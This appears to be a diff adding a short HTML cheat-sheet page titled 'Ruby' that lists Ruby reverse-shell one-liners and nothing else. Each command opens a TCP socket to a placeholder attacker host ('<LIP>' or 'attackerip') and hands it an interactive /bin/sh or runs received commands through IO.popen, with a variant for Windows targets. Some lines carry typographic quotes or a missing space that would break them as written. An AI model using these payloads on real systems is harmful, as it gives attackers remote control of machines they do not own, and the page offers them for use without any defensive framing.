@@ -1,0 +1,17 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Ruby</title>
+</head><body>ruby -rsocket -e'f=TCPSocket.open(&quot;&lt;LIP&gt;&quot;,&lt;LPORT&gt;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'<br/>
+<br/>
+ruby: exec &quot;/bin/sh&quot;<br/>
+<br/>
+<br/>
+Longer Ruby reverse shell that does not depend on /bin/sh:<br/>
+ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(“attackerip”,”4444″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.printio.read}end’<br/>
+<br/>
+If the target system is running Windows use the following one-liner:<br/>
+ruby -rsocket -e ‘c=TCPSocket.new(“attackerip”,”4444″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’<br/>
+<br/>
+ruby -rsocket -e’f=TCPSocket.open(“attackerip”,1234).to_i;exec sprintf(“/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d”,f,f,f)’<br/>
+</body></html>
